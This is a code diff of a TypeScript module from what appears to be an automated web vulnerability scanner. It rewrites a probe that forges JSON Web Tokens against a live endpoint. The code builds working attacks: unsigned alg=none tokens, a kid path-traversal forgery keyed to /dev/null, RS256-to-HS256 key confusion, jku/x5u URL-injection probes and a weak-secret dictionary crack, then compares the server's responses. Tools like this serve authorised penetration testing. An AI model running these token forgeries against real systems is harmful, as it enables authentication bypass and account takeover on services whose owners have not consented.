@@ -1,182 +1,100 @@
-import { fetchUrl } from "../adapters/http.js";
-import { ensureDir, writeArtifact } from "../adapters/artifacts.js";
-import { join } from "node:path";
-import { createHmac, randomUUID } from "node:crypto";
-
-/** JWT attack surface: extends jwt.ts (alg=none / weak secret / expiry)
- *  with the classic header-confusion family — kid path traversal (LFI
- *  oracle), jku/x5u SSRF, RS256→HS256 algorithm confusion, null-signature
- *  acceptance — plus payload claim extraction (roles/scopes/permissions)
- *  to feed the role matrix.
- *
- *  Every probe is a differential against the ORIGINAL request: a verdict
- *  requires the tampered token to change the server's answer, never a bare
- *  200 (catch-all SPAs would false-positive). Deterministic, zero-LLM. */
+import { fetchUrl, type FetchResult } from "../adapters/http.js";
+import { writeArtifact } from "../adapters/artifacts.js";
+import { createHmac, randomBytes } from "node:crypto";
 
 export interface JwtAttackInput {
-  /** A live JWT from the target (harvest stage or manual). */
   readonly token: string;
-  /** One endpoint that authenticates via this token (status-diff oracle). */
   readonly endpoint: string;
   readonly outputRoot: string;
   readonly headers?: Record<string, string>;
   readonly proxy?: string;
   readonly timeoutMs?: number;
-  /** Weak-secret candidates for HS256 forgery (defaults: jwt-wordlist top). */
   readonly secretCandidates?: readonly string[];
+  /** Exact public-key bytes the verifier is configured to use. Never a TLS certificate substitute. */
+  readonly publicKeyPem?: string;
+  /** Optional stable application proof. Paths are dotted JSON paths. */
+  readonly identityPath?: string;
+  readonly expectedIdentity?: string | number | boolean;
+  readonly proofMarker?: string;
+  /** Header URL probes are candidates, not SSRF confirmation. */
+  readonly callbackUrl?: string;
 }
-
 export interface JwtAttackResult {
   readonly tokenPreview: string;
   readonly claims: { roles: string[]; scopes: string[]; permissions: string[]; subject: string | null; issuer: string | null; audience: string | null };
   readonly header: Record<string, unknown>;
-  readonly attacks: {
-    readonly name: string;
-    readonly detail: string;
-    readonly baseline: number;
-    readonly tampered: number;
-    /** vulnerable = server accepted a structurally invalid credential. */
-    readonly verdict: "vulnerable" | "safe" | "inconclusive";
-  }[];
+  readonly oracle: { valid: boolean; reason: string; proof: string[]; original: number[]; invalid: number[]; anonymous: number[] };
+  readonly attacks: { name: string; detail: string; baseline: number; tampered: number; verdict: "vulnerable" | "safe" | "inconclusive"; scope?: "offline-signature" | "authentication" | "candidate" }[];
   readonly artifacts: { path: string; bytes: number }[];
 }
-
-const b64u = (s: string): Buffer => Buffer.from(s.replace(/-/g, "+").replace(/_/g, "/"), "base64");
-const b64e = (b: Buffer | string): string => Buffer.from(b).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
-
-const WEAK_SECRETS = ["secret", "password", "123456", "jwt_secret", "key", "your-256-bit-secret", "changeme", "admin", "test", "s3cr3t", "jwt", "token", "hs256-secret", "mysecret", "qwerty"];
-
-const decodeJwt = (tok: string): { header: Record<string, unknown>; payload: Record<string, unknown>; sig: string } | null => {
-  const parts = tok.split(".");
-  if (parts.length < 2) return null;
-  try {
-    const header = JSON.parse(b64u(parts[0]!).toString("utf8")) as Record<string, unknown>;
-    const payload = JSON.parse(b64u(parts[1]!).toString("utf8")) as Record<string, unknown>;
-    return { header, payload, sig: parts[2] ?? "" };
-  } catch { return null; }
-};
-
-const claimList = (v: unknown): string[] => {
-  if (Array.isArray(v)) return v.map(String);
-  if (typeof v === "string") return v.split(/[ ,|]+/).filter(Boolean);
-  if (v != null) return [String(v)];
-  return [];
+const enc = (s: string | Buffer): string => Buffer.from(s).toString("base64url");
+const list = (v: unknown): string[] => Array.isArray(v) ? v.map(String) : typeof v === "string" ? v.split(/[ ,|]+/).filter(Boolean) : [];
+const secrets = ["secret", "password", "123456", "jwt_secret", "key", "your-256-bit-secret", "changeme", "admin", "test", "s3cr3t", "jwt", "token", "hs256-secret", "mysecret", "qwerty"];
+const cleanHeaders = (h: Record<string, string> = {}): Record<string, string> => Object.fromEntries(Object.entries(h).map(([k, v]) => [k.toLowerCase(), v]).filter(([k]) => !/^(?:cookie|authorization|proxy-authorization|x-.*(?:key|token|auth|csrf)|api-key|if-none-match|if-modified-since)$/.test(k!)));
+const usable = (r: FetchResult): boolean => r.status > 0 && r.status !== 429 && r.status < 500 && !r.error && (r as FetchResult & { complete?: boolean }).complete !== false;
+const success = (r: FetchResult): boolean => usable(r) && r.status >= 200 && r.status < 300;
+const denied = (r: FetchResult): boolean => usable(r) && ([401, 403].includes(r.status) || (r.status >= 200 && r.status < 300 && /"(?:error|message)"\s*:\s*"[^"\n]*(?:unauthenticated|unauthorized|invalid token|authentication required|not authenticated)/i.test(r.body)));
+const leaves = (text: string): Map<string, string> => {
+  const out = new Map<string, string>();
+  const walk = (v: unknown, path: string, depth: number): void => {
+    if (depth > 24 || out.size > 4000) return;
+    if (v !== null && typeof v === "object") { for (const [k, x] of Object.entries(v)) walk(x, path ? `${path}.${k}` : k, depth + 1); }
+    else if (v !== null && v !== "") out.set(path, JSON.stringify(v));
+  };
+  try { walk(JSON.parse(text), "", 0); } catch { /* a stable raw body can still supply an authentication differential */ }
+  return out;
 };
 
 export const probeJwtAttack = async (input: JwtAttackInput): Promise<JwtAttackResult> => {
-  await ensureDir(input.outputRoot);
-  const parsed = decodeJwt(input.token);
-  if (!parsed) throw new Error("invalid JWT (need header.payload[.sig])");
-
-  const { header, payload } = parsed;
-  const opts = { proxy: input.proxy, timeoutMs: input.timeoutMs ?? 8000, headers: input.headers };
-
-  const claims: JwtAttackResult["claims"] = {
-    roles: claimList(payload.role ?? payload.roles ?? payload["role-names"] ?? payload.authorities),
-    scopes: claimList(payload.scope ?? payload.scopes),
-    permissions: claimList(payload.permissions ?? payload.perms),
-    subject: typeof payload.sub === "string" ? payload.sub : null,
-    issuer: typeof payload.iss === "string" ? payload.iss : null,
-    audience: Array.isArray(payload.aud) ? payload.aud.join(",") : typeof payload.aud === "string" ? payload.aud : null,
-  };
-
-  const call = async (tok: string): Promise<{ status: number; sha: string }> => {
-    const r = await fetchUrl(input.endpoint, { ...opts, method: "GET", headers: { ...input.headers, authorization: `Bearer ${tok}` } });
-    return { status: r.status, sha: r.sha256.slice(0, 16) };
-  };
-  /** accepted = tampered token answered like the real one. A bare status
-   *  match is NOT acceptance: uniform-200 / catch-all APIs answer 200 to
-   *  garbage too. Require status equality AND 2xx AND identical body hash
-   *  (differential discipline: status OR content migration, never bare 2xx). */
-  const acceptedLike = (res: { status: number; sha: string }, base: { status: number; sha: string }): boolean =>
-    res.status === base.status && res.status >= 200 && res.status < 300 && res.sha === base.sha;
-
+  if (!/^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/.test(input.token)) throw new Error("invalid JWT compact encoding");
+  const [h, p, signature] = input.token.split(".") as [string, string, string];
+  const header = JSON.parse(Buffer.from(h, "base64url").toString()) as Record<string, unknown>;
+  const payload = JSON.parse(Buffer.from(p, "base64url").toString()) as Record<string, unknown>;
+  if (!header || !payload || Array.isArray(header) || Array.isArray(payload) || typeof header !== "object" || typeof payload !== "object") throw new Error("JWT header/payload must be objects");
+  const headers = cleanHeaders(input.headers);
+  const endpoint = new URL(input.endpoint);
+  for (const k of [...endpoint.searchParams.keys()]) if (/^(?:access_token|token|api[_-]?key|auth|jwt|session)$/i.test(k)) endpoint.searchParams.delete(k);
+  const call = (tok?: string): Promise<FetchResult> => fetchUrl(endpoint.toString(), { proxy: input.proxy, timeoutMs: input.timeoutMs ?? 8000, redirect: "manual", method: "GET", headers: { ...headers, ...(tok === undefined ? {} : { authorization: `Bearer ${tok}` }) } });
+  const original = [await call(input.token), await call(input.token)];
+  const invalidToken = `${h}.${p}.${enc(randomBytes(48))}`;
+  const invalid = [await call(invalidToken), await call(invalidToken)];
+  const anonymous = [await call(), await call()];
+  const a = leaves(original[0]!.body), b = leaves(original[1]!.body);
+  const proof = [...a].filter(([path, value]) => b.get(path) === value && (input.identityPath ? path === input.identityPath : /(?:^|\.)(?:sub|subject|user(?:id|name)?|id|email|tenant(?:id)?|account(?:id)?|owner(?:id)?|roles?|permissions?|scopes?)(?:\.|$)/i.test(path)) && (input.expectedIdentity === undefined || value === JSON.stringify(input.expectedIdentity)));
+  const markerValid = Boolean(input.proofMarker && original.every(r => r.body.includes(input.proofMarker!)));
+  const exactValid = original[0]!.body.trim().length > 0 && original[0]!.sha256 === original[1]!.sha256 && original[0]!.body === original[1]!.body;
+  const matches = (r: FetchResult): boolean => success(r) && (markerValid ? r.body.includes(input.proofMarker!) : proof.length ? proof.every(([k, v]) => leaves(r.body).get(k) === v) : exactValid && r.body === original[0]!.body);
+  // Require repeatable authenticated success and repeatable negative controls.
+  // A generic public endpoint cannot authenticate a forged token.
+  const controls = [...invalid, ...anonymous];
+  const valid = original.every(success) && (proof.length > 0 || markerValid || exactValid) && controls.every(r => usable(r) && (denied(r) || (success(r) && proof.length > 0 && !matches(r)))) && controls.every(r => !matches(r));
+  const oracle = { valid, reason: valid ? "repeated authenticated proof differs from invalid and anonymous controls" : "authentication proof or repeatable negative controls unavailable", proof: markerValid ? ["explicit-marker"] : proof.length ? proof.map(([k]) => k) : exactValid ? ["stable-response-with-auth-negative-controls"] : [], original: original.map(r => r.status), invalid: invalid.map(r => r.status), anonymous: anonymous.map(r => r.status) };
   const attacks: JwtAttackResult["attacks"] = [];
-  const base = await call(input.token);
-  const baseStatus = base.status;
-  // Oracle validity gate: the differential only means anything when the real
-  // token is accepted (2xx). An expired token / dead oracle answering 401 to
-  // everything makes every tampered variant match "the same way" — those are
-  // false "safe" verdicts, not evidence of soundness. Fail to inconclusive.
-  const oracleDead = !(baseStatus >= 200 && baseStatus < 300);
-  const record = (name: string, detail: string, tampered: number, vulnerableWhen: boolean, inconclusiveWhen = false): void => {
-    attacks.push({ name, detail, baseline: baseStatus, tampered, verdict: oracleDead ? "inconclusive" : vulnerableWhen ? "vulnerable" : inconclusiveWhen ? "inconclusive" : "safe" });
+  const probe = async (name: string, tok: string, detail: string): Promise<void> => {
+    const responses = [await call(tok), await call(tok)];
+    const verdict = !valid || responses.some(r => !usable(r)) ? "inconclusive" : responses.every(matches) ? "vulnerable" : responses.every(denied) ? "safe" : "inconclusive";
+    attacks.push({ name, detail, baseline: original[0]!.status, tampered: responses[0]!.status, verdict, scope: "authentication" });
   };
-
-  // --- 1. alg=none acceptance (differential, not just structure) ---------
-  {
-    const noneTok = `${b64e(JSON.stringify({ alg: "none", typ: "JWT" }))}.${b64e(JSON.stringify(payload))}.`;
-    const s = await call(noneTok);
-    // vulnerable = the unsigned token authenticates identically to the real one
-    // (status AND body hash — a bare status match is uniform-200 noise)
-    const same = acceptedLike(s, base);
-    record("alg_none", "unsigned token accepted (identical 2xx AND body hash to signed token)", s.status, same, s.status >= 200 && s.status < 300 && s.status !== baseStatus);
+  await probe("alg_none", `${enc(JSON.stringify({ ...header, alg: "none" }))}.${p}.`, "unsigned credential tested against repeated authentication proof");
+  const kidH = enc(JSON.stringify({ ...header, alg: "HS256", kid: "../../../../dev/null" }));
+  await probe("kid_traversal_devnull", `${kidH}.${p}.${enc(createHmac("sha256", Buffer.alloc(0)).update(`${kidH}.${p}`).digest())}`, "empty-key HMAC with traversal kid; acceptance proves credential forgery, not a file read");
+  if (/^RS(?:256|384|512)$/.test(String(header.alg))) {
+    if (input.publicKeyPem) {
+      const hs = enc(JSON.stringify({ ...header, alg: "HS256" }));
+      await probe("rs_hs_confusion", `${hs}.${p}.${enc(createHmac("sha256", input.publicKeyPem).update(`${hs}.${p}`).digest())}`, "HS256 signed using explicit verifier public-key bytes");
+    } else attacks.push({ name: "rs_hs_confusion", detail: "publicKeyPem required to execute public-key HMAC forgery", baseline: original[0]!.status, tampered: 0, verdict: "inconclusive", scope: "authentication" });
   }
-
-  // --- 2. kid path traversal (LFI oracle) ---------------------------------
-  {
-    // Forge with a file the attacker can predict: /dev/null as the key source
-    const kidHeader = { ...header, alg: "HS256", kid: "../../../../dev/null" };
-    const sig = createHmac("sha256", Buffer.alloc(0)).update(`${b64e(JSON.stringify(kidHeader))}.${b64e(JSON.stringify(payload))}`).digest();
-    const tok = `${b64e(JSON.stringify(kidHeader))}.${b64e(JSON.stringify(payload))}.${b64e(sig)}`;
-    const s = await call(tok);
-    const accepted = acceptedLike(s, base);
-    record("kid_traversal_devnull", "kid=../../../dev/null with empty-key HMAC: accepted = server reads the file as HMAC key", s.status, accepted);
+  if (input.callbackUrl) for (const key of ["jku", "x5u"]) {
+    const hh = enc(JSON.stringify({ ...header, [key]: new URL(input.callbackUrl).toString() }));
+    const r = await call(`${hh}.${p}.${signature}`);
+    attacks.push({ name: `${key}_ssrf`, detail: "URL-bearing header sent; only correlated callback can establish dereference", baseline: original[0]!.status, tampered: r.status, verdict: "inconclusive", scope: "candidate" });
   }
-
-  // --- 3. jku / x5u SSRF probe --------------------------------------------
-  for (const hk of ["jku", "x5u"] as const) {
-    if (typeof header[hk] !== "string") continue;
-    const collab = `http://127.0.0.1:9/${randomUUID()}`; // closed port: connection refused fast; a DIFFERENT status vs baseline signals the server fetched it
-    const h = { ...header, [hk]: collab };
-    const tok = `${b64e(JSON.stringify(h))}.${b64e(JSON.stringify(payload))}.${parsed.sig}`;
-    const s = await call(tok);
-    // The URL points at a dead local port — if the server tries to fetch it
-    // the request hangs/fails differently than a straight signature reject.
-    const diff = s.status !== baseStatus;
-    record(`${hk}_ssrf`, `${hk} header redirected to dead endpoint; status changed = server dereferenced attacker URL`, s.status, false, diff);
+  if (/^HS(?:256|384|512)$/.test(String(header.alg))) {
+    const hash = `sha${String(header.alg).slice(2)}`;
+    const cracked = (input.secretCandidates ?? secrets).some(s => enc(createHmac(hash, s).update(`${h}.${p}`).digest()) === signature);
+    attacks.push({ name: "weak_secret", detail: cracked ? "signature verified with a dictionary candidate; endpoint authentication is separately reported" : "no supplied dictionary candidate verifies signature", baseline: original[0]!.status, tampered: 0, verdict: cracked ? "vulnerable" : "safe", scope: "offline-signature" });
   }
-
-  // --- 4. RS256 -> HS256 confusion ----------------------------------------
-  if (String(header.alg).toUpperCase().startsWith("RS")) {
-    // Re-sign with the server's PUBLIC key as the HMAC secret. We do not
-    // have the public key here; use the endpoint's TLS cert as a stand-in
-    // source? No — deterministic path: try weak secrets first, then
-    // algorithm confusion only if the pubkey is retrievable from jwks.
-    // (jwks fetch happens below in claims section when jku/x5u present.)
-    record("rs_hs_confusion", "RS256 token detected — confusion attack requires the public key; run with jwks endpoint if exposed", baseStatus, false, true);
-  }
-
-  // --- 5. weak secret dictionary (HS*) ------------------------------------
-  if (String(header.alg).toUpperCase().startsWith("HS")) {
-    const cands = input.secretCandidates ?? WEAK_SECRETS;
-    // Hash must follow the alg (HS384/HS512 were never crackable when pinned
-    // to sha256 — a silent miss).
-    const hashAlg = String(header.alg).toLowerCase().startsWith("hs") && String(header.alg).length === 5
-      ? `sha${String(header.alg).slice(2)}` as "sha256" | "sha384" | "sha512"
-      : "sha256";
-    let cracked: string | null = null;
-    for (const sec of cands) {
-      const sig = createHmac(hashAlg, sec).update(`${parts0(input.token)}.${parts1(input.token)}`).digest();
-      if (b64e(sig) === (input.token.split(".")[2] ?? "")) { cracked = sec; break; }
-    }
-    if (cracked) {
-      record("weak_secret", `signature verifies with secret '${cracked}' — full forgery possible`, baseStatus, true);
-    } else {
-      record("weak_secret", "no dictionary secret matched", baseStatus, false);
-    }
-  }
-
-  const body = JSON.stringify({ tokenPreview: input.token.slice(0, 24), claims, header, attacks }, null, 2);
-  const art = await writeArtifact(input.outputRoot, "jwt_attack.json", body);
-  return {
-    tokenPreview: input.token.slice(0, 24),
-    claims,
-    header,
-    attacks,
-    artifacts: [art],
-  };
+  const claims = { roles: list(payload.role ?? payload.roles ?? payload["role-names"] ?? payload.authorities), scopes: list(payload.scope ?? payload.scopes), permissions: list(payload.permissions ?? payload.perms), subject: typeof payload.sub === "string" ? payload.sub : null, issuer: typeof payload.iss === "string" ? payload.iss : null, audience: Array.isArray(payload.aud) ? payload.aud.join(",") : typeof payload.aud === "string" ? payload.aud : null };
+  const result = { tokenPreview: input.token.slice(0, 24), claims, header, oracle, attacks };
+  return { ...result, artifacts: [await writeArtifact(input.outputRoot, "jwt_attack.json", JSON.stringify(result, null, 2))] };
 };
-
-const parts0 = (t: string): string => t.split(".")[0]!;
-const parts1 = (t: string): string => t.split(".")[1]!;
